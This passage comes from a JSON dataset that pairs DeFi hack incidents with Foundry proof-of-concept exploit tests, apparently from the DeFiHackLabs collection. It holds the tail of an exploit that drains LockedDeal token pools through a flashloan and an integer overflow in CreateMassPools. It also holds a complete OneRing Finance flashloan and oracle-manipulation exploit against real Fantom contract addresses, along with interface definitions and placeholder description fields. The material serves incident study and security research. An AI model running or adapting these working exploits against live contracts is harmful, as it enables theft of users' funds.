transfer_data[1] = sip_balance;\n            (firstPoolId, lastPoolId) = poolzpool.CreateMassPools(address(sip),\n                begintime,\n                transfer_data,\n                owner_addr);\n            poolzpool.WithdrawToken(lastPoolId);\n            sellsip();\n            emit log_named_decimal_uint(\"[After sip Exp] pool sip  balance\", sip.balanceOf(address(poolzpool)), 18);\n            emit log_named_decimal_uint(\"[After sip Exp] user wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n            wbnb.withdraw(1e18);\n            emit log_named_decimal_uint(\"[Before wod Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n            address[] memory simplepath = new address[](2);\n            simplepath[0] = address(wbnb);\n            simplepath[1] = address(wod);\n            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, simplepath, address(this), block.timestamp);\n            uint256 wod_balance = wod.balanceOf(address(poolzpool));\n            emit log_named_decimal_uint(\"[wod Exp] pool wod  balance\", wod.balanceOf(address(poolzpool)), 18);\n            overflow_data = type(uint256).max - wod_balance + 2;\n            transfer_data[0] = overflow_data;\n            transfer_data[1] = wod_balance;\n            (firstPoolId, lastPoolId) = poolzpool.CreateMassPools(address(wod),\n                begintime,\n                transfer_data,\n                owner_addr);\n            poolzpool.WithdrawToken(lastPoolId);\n            sellwod();\n            emit log_named_decimal_uint(\"[After wod Exp] pool wod  balance\", wod.balanceOf(address(poolzpool)), 18);\n            emit log_named_decimal_uint(\"[After wod Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n            wbnb.withdraw(1e18);\n            emit log_named_decimal_uint(\"[Before ecio Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n            swapPath[0] = address(wbnb);\n            swapPath[1] = address(busd);\n            swapPath[2] = address(ecio);\n            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, swapPath, address(this), block.timestamp);\n            uint256 ecio_balance = ecio.balanceOf(address(poolzpool));\n            emit log_named_decimal_uint(\"[ecio Exp] pool ecio  balance\", ecio.balanceOf(address(poolzpool)), 18);\n            overflow_data = type(uint256).max - ecio_balance + 2;\n            transfer_data[0] = overflow_data;\n            transfer_data[1] = ecio_balance;\n            (firstPoolId, lastPoolId) = poolzpool.CreateMassPools(address(ecio),\n                begintime,\n                transfer_data,\n                owner_addr);\n            poolzpool.WithdrawToken(lastPoolId);\n            sellecio();\n            emit log_named_decimal_uint(\"[After ecio Exp] pool ecio  balance\", ecio.balanceOf(address(poolzpool)), 18);\n            emit log_named_decimal_uint(\"[After ecio Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n            emit log_named_decimal_uint(\"[Total exploit wbnb balance ] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n            wbnb.transfer(address(dppAdvanced), 1 * 1e18);\n        }\n    }\n    function sellecio() internal{\n        address [] memory path = new address[](3);\n        path[0] = address(ecio);\n        path[1] = address(busd);\n        path[2] = address(wbnb);\n        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(ecio.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp);\n    }\n    function sellwod() internal{\n        address [] memory path = new address[](2);\n        path[0] = address(wod);\n        path[1] = address(wbnb);\n        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(wod.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp);\n    }\n    function sellsip() internal{\n        address [] memory path = new address[](3);\n        path[0] = address(sip);\n        path[1] = address(busd);\n        path[2] = address(wbnb);\n        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(sip.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp);\n    }\n    function sellmnz() internal{\n        address [] memory path = new address[](3);\n        path[0] = address(mnz);\n        path[1] = address(busd);\n        path[2] = address(wbnb);\n        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(mnz.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp);\n    }\n    receive() external payable {}\n}\ninterface IDPPAdvanced {\n    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes memory data) external;\n} \ninterface LockedDeal {\n    event NewPoolCreated(uint256 PoolId,\n        address Token,\n        uint64 FinishTime,\n        uint256 StartAmount,\n        address Owner);\n    event OwnershipTransferred(address indexed previousOwner,\n        address indexed newOwner);\n    event PoolApproval(uint256 PoolId, address Spender, uint256 Amount);\n    event PoolOwnershipTransfered(uint256 PoolId,\n        address NewOwner,\n        address OldOwner);\n    event TransferIn(uint256 Amount, address From, address Token);\n    event TransferInETH(uint256 Amount, address From);\n    event TransferOut(uint256 Amount, address To, address Token);\n    event TransferOutETH(uint256 Amount, address To);\n    function ApproveAllowance(uint256 _PoolId,\n        uint256 _Amount,\n        address _Spender) external;\n    function CreateMassPools(address _Token,\n        uint64[] memory _FinishTime,\n        uint256[] memory _StartAmount,\n        address[] memory _Owner) external returns (uint256, uint256);\n    function CreateNewPool(address _Token,\n        uint64 _FinishTime,\n        uint256 _StartAmount,\n        address _Owner) external returns (uint256);\n    function CreatePoolsWrtTime(address _Token,\n        uint64[] memory _FinishTime,\n        uint256[] memory _StartAmount,\n        address[] memory _Owner) external returns (uint256, uint256);\n    function GetFee() external view returns (uint16);\n    function GetMinDuration() external view returns (uint16);\n    function GetMyPoolsId() external view returns (uint256[] memory);\n    function GetPoolAllowance(uint256 _PoolId, address _Address)\n        external\n        view\n        returns (uint256);\n    function GetPoolData(uint256 _id)\n        external\n        view\n        returns (uint64,\n            uint256,\n            address,\n            address);\n    function GovernerContract() external view returns (address);\n    function IsPayble() external view returns (bool);\n    function PozFee() external view returns (uint256);\n    function PozTimer() external view returns (uint256);\n    function SetFee(uint16 _fee) external;\n    function SetMinDuration(uint16 _minDuration) external;\n    function SetPOZFee(uint16 _fee) external;\n    function SetPozTimer(uint256 _pozTimer) external;\n    function SplitPoolAmount(uint256 _PoolId,\n        uint256 _NewAmount,\n        address _NewOwner) external returns (uint256);\n    function SplitPoolAmountFrom(uint256 _PoolId,\n        uint256 _Amount,\n        address _Address) external returns (uint256);\n    function SwitchIsPayble() external;\n    function TransferPoolOwnership(uint256 _PoolId, address _NewOwner) external;\n    function WhiteListId() external view returns (uint256);\n    function WhiteList_Address() external view returns (address);\n    function WithdrawERC20Fee(address _Token, address _to) external;\n    function WithdrawETHFee(address _to) external;\n    function WithdrawToken(uint256 _PoolId) external returns (bool);\n    function isTokenFilterOn() external view returns (bool);\n    function isTokenWhiteListed(address _tokenAddress)\n        external\n        view\n        returns (bool);\n    function maxTransactionLimit() external view returns (uint256);\n    function name() external view returns (string memory);\n    function owner() external view returns (address);\n    function renounceOwnership() external;\n    function setGovernerContract(address _address) external;\n    function setMaxTransactionLimit(uint256 _newLimit) external;\n    function setWhiteListAddress(address _address) external;\n    function setWhiteListId(uint256 _id) external;\n    function swapTokenFilter() external;\n    function transferOwnership(address newOwner) external;\n    receive() external payable;\n}",
                "token_count": 3158,
                "interfaces": [
                    {
                        "name": "IDPPAdvanced",
                        "content": "interface IDPPAdvanced {\n  \n\n    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes memory data) external;\n   \n} \n",
                        "token_count": 33,
                        "imported": false
                    },
                    {
                        "name": "LockedDeal",
                        "content": "interface LockedDeal {\n    event NewPoolCreated(\n        uint256 PoolId,\n        address Token,\n        uint64 FinishTime,\n        uint256 StartAmount,\n        address Owner\n    );\n    event OwnershipTransferred(\n        address indexed previousOwner,\n        address indexed newOwner\n    );\n    event PoolApproval(uint256 PoolId, address Spender, uint256 Amount);\n    event PoolOwnershipTransfered(\n        uint256 PoolId,\n        address NewOwner,\n        address OldOwner\n    );\n    event TransferIn(uint256 Amount, address From, address Token);\n    event TransferInETH(uint256 Amount, address From);\n    event TransferOut(uint256 Amount, address To, address Token);\n    event TransferOutETH(uint256 Amount, address To);\n\n    function ApproveAllowance(\n        uint256 _PoolId,\n        uint256 _Amount,\n        address _Spender\n    ) external;\n\n    function CreateMassPools(\n        address _Token,\n        uint64[] memory _FinishTime,\n        uint256[] memory _StartAmount,\n        address[] memory _Owner\n    ) external returns (uint256, uint256);\n\n    function CreateNewPool(\n        address _Token,\n        uint64 _FinishTime,\n        uint256 _StartAmount,\n        address _Owner\n    ) external returns (uint256);\n\n    function CreatePoolsWrtTime(\n        address _Token,\n        uint64[] memory _FinishTime,\n        uint256[] memory _StartAmount,\n        address[] memory _Owner\n    ) external returns (uint256, uint256);\n\n    function GetFee() external view returns (uint16);\n\n    function GetMinDuration() external view returns (uint16);\n\n    function GetMyPoolsId() external view returns (uint256[] memory);\n\n    function GetPoolAllowance(uint256 _PoolId, address _Address)\n        external\n        view\n        returns (uint256);\n\n    function GetPoolData(uint256 _id)\n        external\n        view\n        returns (\n            uint64,\n            uint256,\n            address,\n            address\n        );\n\n    function GovernerContract() external view returns (address);\n\n    function IsPayble() external view returns (bool);\n\n    function PozFee() external view returns (uint256);\n\n    function PozTimer() external view returns (uint256);\n\n    function SetFee(uint16 _fee) external;\n\n    function SetMinDuration(uint16 _minDuration) external;\n\n    function SetPOZFee(uint16 _fee) external;\n\n    function SetPozTimer(uint256 _pozTimer) external;\n\n    function SplitPoolAmount(\n        uint256 _PoolId,\n        uint256 _NewAmount,\n        address _NewOwner\n    ) external returns (uint256);\n\n    function SplitPoolAmountFrom(\n        uint256 _PoolId,\n        uint256 _Amount,\n        address _Address\n    ) external returns (uint256);\n\n    function SwitchIsPayble() external;\n\n    function TransferPoolOwnership(uint256 _PoolId, address _NewOwner) external;\n\n    function WhiteListId() external view returns (uint256);\n\n    function WhiteList_Address() external view returns (address);\n\n    function WithdrawERC20Fee(address _Token, address _to) external;\n\n    function WithdrawETHFee(address _to) external;\n\n    function WithdrawToken(uint256 _PoolId) external returns (bool);\n\n    function isTokenFilterOn() external view returns (bool);\n\n    function isTokenWhiteListed(address _tokenAddress)\n        external\n        view\n        returns (bool);\n\n    function maxTransactionLimit() external view returns (uint256);\n\n    function name() external view returns (string memory);\n\n    function owner() external view returns (address);\n\n    function renounceOwnership() external;\n\n    function setGovernerContract(address _address) external;\n\n    function setMaxTransactionLimit(uint256 _newLimit) external;\n\n    function setWhiteListAddress(address _address) external;\n\n    function setWhiteListId(uint256 _id) external;\n\n    function swapTokenFilter() external;\n\n    function transferOwnership(address newOwner) external;\n\n    receive() external payable;\n}",
                        "token_count": 839,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "IPancakeRouter",
                        "content": "interface IPancakeRouter {\n  function WETH() external view returns (address);\n\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  payable\n  returns (\n    uint256 amountToken,\n    uint256 amountETH,\n    uint256 liquidity\n  );\n\n  function factory() external view returns (address);\n\n  function getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountIn);\n\n  function getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountOut);\n\n  function getAmountsIn(uint256 amountOut, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function getAmountsOut(uint256 amountIn, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n  ) external pure returns (uint256 amountB);\n\n  function removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function removeLiquidityETH(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityETHWithPermit(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function swapETHForExactTokens(\n    uint256 amountOut,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactTokensForTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapTokensForExactETH(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  receive() external payable;\n}\n",
                        "token_count": 1170,
                        "imported": true
                    },
                    {
                        "name": "WBNB",
                        "content": "interface WBNB {\n  function deposit() external payable;\n\n  function withdraw(uint256 wad) external;\n\n  function balanceOf(address account) external view returns (uint256);\n\n  function transfer(address recipient, uint256 amount) external returns (bool);\n}\n",
                        "token_count": 52,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "0b3cd130aa",
        "is_ready": false,
        "content": "### 20220321 OneRing Finance - Flashloan & Price Oracle Manipulation\n#### Lost: $1.45 million\n#### Contract\n[OneRing_exp.sol](src/test/OneRing_exp.sol)\n#### Link reference\nhttps://medium.com/oneringfinance/onering-finance-exploit-post-mortem-after-oshare-hack-602a529db99b\nhttps://ftmscan.com/tx/0xca8dd33850e29cf138c8382e17a19e77d7331b57c7a8451648788bbb26a70145",
        "date": "20220321",
        "target": "OneRing Finance",
        "attack_title": "Flashloan & Price Oracle Manipulation",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://medium.com/oneringfinance/onering-finance-exploit-post-mortem-after-oshare-hack-602a529db99b",
                "content": "content of the link"
            },
            {
                "link": "https://ftmscan.com/tx/0xca8dd33850e29cf138c8382e17a19e77d7331b57c7a8451648788bbb26a70145",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/OneRing_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\ncontract ContractTest is DSTest {\n    IUniswapV2Pair pair = IUniswapV2Pair(0xbcab7d083Cf6a01e0DdA9ed7F8a02b47d125e682);\n    IERC20 usdc = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);\n    IOneRingVault vault = IOneRingVault(0x4e332D616b5bA1eDFd87c899E534D996c336a2FC);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() public {\n        cheats.createSelectFork(\"fantom\", 34041499);//fork fantom at block 34041499\n    }\n    function testExploit() public {\n        emit log_named_uint(\"Before exploit, USDC  balance of attacker:\", usdc.balanceOf(msg.sender));\n     pair.swap(80000000*1e6,0,address(this),new bytes(1));\n        emit log_named_uint(\"After exploit, USDC  balance of attacker:\", usdc.balanceOf(msg.sender));\n}\n    function hook(address sender, uint amount0, uint amount1, bytes calldata data) external{\n        usdc.approve(address(vault),type(uint256).max);\n        vault.depositSafe(amount0,address(usdc),1);\n        vault.withdraw(vault.balanceOf(address(this)),address(usdc));\n        usdc.transfer(msg.sender,(amount0/9999*10000)+10000);\n        usdc.transfer(tx.origin,usdc.balanceOf(address(this)));\n    }\n}",
                "token_count": 407,
                "interfaces": [
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) 